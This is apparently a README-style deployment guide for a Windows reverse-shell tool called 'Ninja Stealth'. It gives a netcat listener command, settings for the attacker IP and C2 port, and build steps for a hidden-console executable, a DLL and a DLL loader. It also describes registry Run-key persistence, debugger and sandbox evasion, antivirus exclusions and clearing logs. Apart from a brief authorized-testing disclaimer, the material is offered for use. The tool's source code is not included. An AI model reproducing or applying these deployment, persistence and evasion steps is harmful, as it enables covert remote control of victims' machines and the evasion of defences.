# 🥷 Ninja Stealth Deployment Guide

## Quick Start (Netcat Mode)

The fastest way to test the reverse shell:

### 1. Start Listener
```bash
# On your attack machine (Kali/Linux)
nc -lvnp 44895

# Or on Windows with netcat
nc.exe -lvnp 44895
```

### 2. Configure & Execute
```cpp
// In Reverse-Shell.cpp, line ~15
std::string ip = "YOUR_IP_HERE";    // Replace with your machine IP
int port = 44895;                   // Your chosen port
```

### 3. Compile & Run
```bash
g++ -mwindows -static -o Ninja-Stealth-Netcat-Static.exe Reverse-Shell.cpp -lws2_32 -lwinhttp -std=c++11
```

Transfer the executable to your target VM and run it. You'll get a reverse shell!

---

## Advanced Deployment Methods

### Method 1: Executable Deployment

**Standard Build:**
```bash
g++ -o Ninja-Stealth.exe Reverse-Shell.cpp -lws2_32 -lwinhttp -std=c++11
```

**Stealth Build (No Console):**
```bash
g++ -mwindows -static -o Ninja-Stealth-Netcat-Static.exe Reverse-Shell.cpp -lws2_32 -lwinhttp -std=c++11
```

**PowerShell Enhanced Build:**
```bash
g++ -mwindows -static -o Ninja-PowerShell.exe Reverse-Shell.cpp -lws2_32 -lwinhttp -std=c++11
```

### Method 2: DLL Deployment

**Compile DLL:**
```bash
g++ -shared -o Ninja-Stealth-DLL.dll Ninja-Stealth-DLL.cpp -lws2_32 -lwinhttp -std=c++11
```

**Load DLL via PowerShell:**
```powershell
# Load and execute DLL
.\Load-Ninja-DLL.ps1
```

**Manual DLL Loading:**
```bash
# Compile the loader
g++ -o Ninja-DLL-Loader.exe Ninja-DLL-Loader.cpp -std=c++11

# Run the loader
Ninja-DLL-Loader.exe Ninja-Stealth-DLL.dll
```

---

## Configuration Options

### Network Settings
```cpp
// Modify these values in the source code
std::string ip = "192.168.1.100";    // Your C2 server IP
int port = 44895;                    // Your C2 port
```

### Persistence Options
The tool automatically adds itself to Windows registry for persistence:
- Registry key: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
- Value name: `NinjaStealth`

### Anti-Analysis Features
- Debugger detection
- Sandbox evasion
- Process name randomization
- Delayed execution

---

## Troubleshooting

### Connection Issues
1. **Firewall**: Ensure port 44895 is open on your listener machine
2. **IP Address**: Verify target can reach your IP address
3. **Port Conflicts**: Try different ports if 44895 is in use

### Compilation Issues
1. **Missing Libraries**: Install MinGW-w64 with Win32 development libraries
2. **Header Conflicts**: Ensure winsock2.h is included before windows.h
3. **Linking Errors**: Verify -lws2_32 and -lwinhttp flags are present

### Execution Issues
1. **Antivirus**: Add exclusion for testing environment
2. **Permissions**: Run as administrator if needed for certain operations
3. **Dependencies**: Static builds include all dependencies

---

## Security Considerations

⚠️ **IMPORTANT**: This tool is for authorized security testing only!

- Use only in controlled, authorized environments
- Always obtain proper permission before deployment
- Monitor for unexpected behavior
- Clean up after testing (remove persistence, clear logs)

---

## Quick Reference

| Component | File | Purpose |
|-----------|------|---------|
| Main Executable | Ninja-Stealth-Netcat-Static.exe | Primary reverse shell |
| DLL Version | Ninja-Stealth-DLL.dll | Stealth DLL injection |
| DLL Loader | Ninja-DLL-Loader.exe | DLL injection utility |
| PowerShell Script | Load-Ninja-DLL.ps1 | PowerShell DLL loading |

**Default Port**: 44895
**Default IP**: Configurable (set in source)
**Protocol**: TCP
**Encryption**: XOR (configurable)